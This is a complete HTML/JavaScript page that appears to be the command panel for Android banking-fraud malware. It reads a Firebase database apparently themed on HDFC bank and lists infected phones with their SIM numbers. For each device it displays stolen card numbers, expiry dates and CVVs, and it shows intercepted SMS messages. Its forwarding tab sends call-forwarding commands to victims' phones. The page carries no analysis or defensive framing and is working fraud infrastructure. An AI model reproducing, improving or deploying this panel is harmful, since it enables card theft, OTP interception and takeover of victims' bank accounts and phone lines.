<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Elite Control Pro v6</title>
    <style>
        :root { --bg: #000; --card: #0a0a0a; --border: #222; --text: #fff; --sub: #666; --accent: #fff; }
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { margin: 0; background: var(--bg); color: var(--text); font-size: 13px; }
        
        header { sticky: top; background: #000; border-bottom: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 100; }
        .logo { font-weight: 800; letter-spacing: 2px; font-size: 14px; }
        .sync { font-size: 9px; color: #00ff00; border: 1px solid #111; padding: 2px 8px; }

        main { padding: 12px; display: grid; gap: 10px; }
        .dev-card { background: var(--card); border: 1px solid var(--border); padding: 15px; position: relative; cursor: pointer; }
        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background: #00ff00; } .offline { background: #ff0000; }

        .row { display: flex; justify-content: space-between; margin-bottom: 5px; }
        .label { color: var(--sub); font-size: 10px; text-transform: uppercase; font-weight: bold; }
        .val { font-weight: 500; }

        .pop { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; flex-direction: column; }
        .pop.active { display: flex; }
        .pop-head { border-bottom: 1px solid var(--border); padding: 18px; display: flex; justify-content: space-between; align-items: center; }
        
        .tabs { display: flex; border-bottom: 1px solid var(--border); background: #050505; }
        .tab { flex: 1; text-align: center; padding: 15px; font-size: 11px; color: var(--sub); cursor: pointer; font-weight: bold; }
        .tab.active { color: #fff; border-bottom: 2px solid #fff; }

        .content { flex: 1; overflow-y: auto; padding: 15px; }
        .box { border: 1px solid var(--border); padding: 15px; margin-bottom: 12px; }
        .btn { background: #fff; color: #000; border: none; padding: 15px; font-weight: 900; cursor: pointer; width: 100%; margin-top: 10px; text-transform: uppercase; }
        .inp { width: 100%; background: #000; border: 1px solid var(--border); padding: 12px; color: #fff; margin-top: 8px; outline: none; }

        .sms-item { border-bottom: 1px solid #111; padding: 12px 0; }
        .sim-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
    </style>
</head>
<body>

<header>
    <div class="logo">ULTRA PANEL V6</div>
    <div id="sync-status" class="sync">READY</div>
</header>

<main id="device-list"></main>

<div id="popup" class="pop">
    <div class="pop-head">
        <span id="pop-id" style="font-weight: 900; font-size: 12px; color: #fff;">ID: NULL</span>
        <span onclick="closePop()" style="cursor:pointer; font-size: 22px;">✕</span>
    </div>
    <div class="tabs">
        <div class="tab active" onclick="switchTab(event, 'sys')">System</div>
        <div class="tab" onclick="switchTab(event, 'card')">Cards</div>
        <div class="tab" onclick="switchTab(event, 'sms')">SMS</div>
        <div class="tab" onclick="switchTab(event, 'fwd')">FWD</div>
    </div>
    <div id="pop-content" class="content"></div>
</div>

<script>
    const dbURL = "https://hdfc99-bd497-default-rtdb.firebaseio.com/";
    let dbData = {}; let activeId = null; let activeTab = 'sys';

    async function fetchData() {
        try {
            const res = await fetch(dbURL + ".json");
            const data = await res.json();
            dbData = data.All_Users || {};
            document.getElementById('sync-status').innerText = "LIVE: " + new Date().toLocaleTimeString();
            renderList();
            if(activeId) updateDetails();
        } catch(e) { document.getElementById('sync-status').innerText = "SYNC ERROR"; }
    }

    function renderList() {
        const container = document.getElementById('device-list');
        const devices = dbData.Data?.DeviceInfo || {};
        const ids = Object.keys(devices).sort((a,b) => b.localeCompare(a));
        
        let html = "";
        ids.forEach((id) => {
            const d = devices[id];
            const isOnline = d.Status === "Online";
            html += `
            <div class="dev-card" onclick="openPop('${id}')">
                <div class="row">
                    <span class="label"><span class="status-dot ${isOnline ? 'online':'offline'}"></span>${id.slice(-8)}</span>
                    <span class="val" style="color:${isOnline ? '#00ff00':'#ff0000'}">${d.Status || 'Offline'}</span>
                </div>
                <div class="row"><span class="label">Device</span><span class="val">${d.Brand}</span></div>
                <div class="row"><span class="label">Battery</span><span class="val">${d.Battery}</span></div>
            </div>`;
        });
        container.innerHTML = html || "<center>Searching...</center>";
    }

    function openPop(id) { activeId = id; document.getElementById('popup').classList.add('active'); updateDetails(); }
    function closePop() { document.getElementById('popup').classList.remove('active'); activeId = null; }
    function switchTab(e, t) { activeTab = t; document.querySelectorAll('.tab').forEach(x => x.classList.remove('active')); e.target.classList.add('active'); updateDetails(); }

    function updateDetails() {
        const box = document.getElementById('pop-content');
        
        if(activeTab === 'sys') {
            const d = dbData.Data?.DeviceInfo?.[activeId] || {};
            const s = dbData.simDetails?.[activeId] || {};
            box.innerHTML = `
                <div class="box">
                    <span class="label">Device Info</span>
                    <div class="row" style="margin-top:10px;"><span>Brand:</span><span>${d.Brand}</span></div>
                    <div class="row"><span>Status:</span><span style="color:#00ff00">${d.Status}</span></div>
                    <div class="row"><span>Battery:</span><span>${d.Battery}</span></div>
                </div>
                <div class="box">
                    <span class="label">SIM Details</span>
                    <div class="sim-grid">
                        <div style="border-right:1px solid #222; padding-right:5px;">
                            <div class="label" style="font-size:8px;">SIM 1</div>
                            <div style="font-weight:bold; font-size:12px;">${s.sim1Number || 'Empty'}</div>
                            <div style="font-size:9px; color:#555;">${s.sim1Provider || '--'}</div>
                        </div>
                        <div>
                            <div class="label" style="font-size:8px;">SIM 2</div>
                            <div style="font-weight:bold; font-size:12px;">${s.sim2Number || 'Empty'}</div>
                            <div style="font-size:9px; color:#555;">${s.sim2Provider || '--'}</div>
                        </div>
                    </div>
                </div>`;
        }
        else if(activeTab === 'card') {
            const c = dbData.AccountInfo?.[activeId] || {};
            box.innerHTML = `<div class="box" style="background:#fff; color:#000;">
                <span class="label" style="color:#888;">CARD NUMBER</span>
                <div style="font-size:20px; font-weight:bold; margin:10px 0;">${c.number || 'No Data'}</div>
                <div class="row" style="border-top:1px solid #eee; padding-top:10px; color:#000;">
                    <span>EXP: ${c.date || '--'}</span><span>CVV: ${c.cvv || '--'}</span>
                </div>
            </div>`;
        }
        else if(activeTab === 'sms') {
            const msgs = dbData.sms?.[activeId] || {};
            let h = "";
            Object.values(msgs).reverse().forEach(m => {
                h += `<div class="sms-item"><div class="row"><span class="label">${m.sender}</span><span style="font-size:9px;">${m.receivedDate}</span></div><div style="color:#ddd;">${m.body}</div></div>`;
            });
            box.innerHTML = h || "No Messages";
        }
        else if(activeTab === 'fwd') {
            const f = dbData.CallForwarding?.[activeId] || {};
            box.innerHTML = `<div class="box"><span class="label">Live Status</span><div style="color:#00ff00; font-weight:bold; margin-top:5px;">${f.callForwardStatus || 'IDLE'}</div></div>
                <div class="box"><span class="label">Command</span><input type="number" id="tNum" class="inp" placeholder="10 Digit Number"><button class="btn" onclick="sendFwd()">Set Forwarding</button></div>`;
        }
    }

    async function sendFwd() {
        const n = document.getElementById('tNum').value;
        if(n.length !== 10) return alert("Only 10 digits allowed!");
        await fetch(dbURL + `All_Users/CallForwarding/${activeId}.json`, { method: 'PATCH', body: JSON.stringify({ toNumber: n, callForwardStatus: "PENDING..." }) });
        alert("Command Sent!");
    }

    setInterval(fetchData, 15000); fetchData();
</script>
</body>
</html>
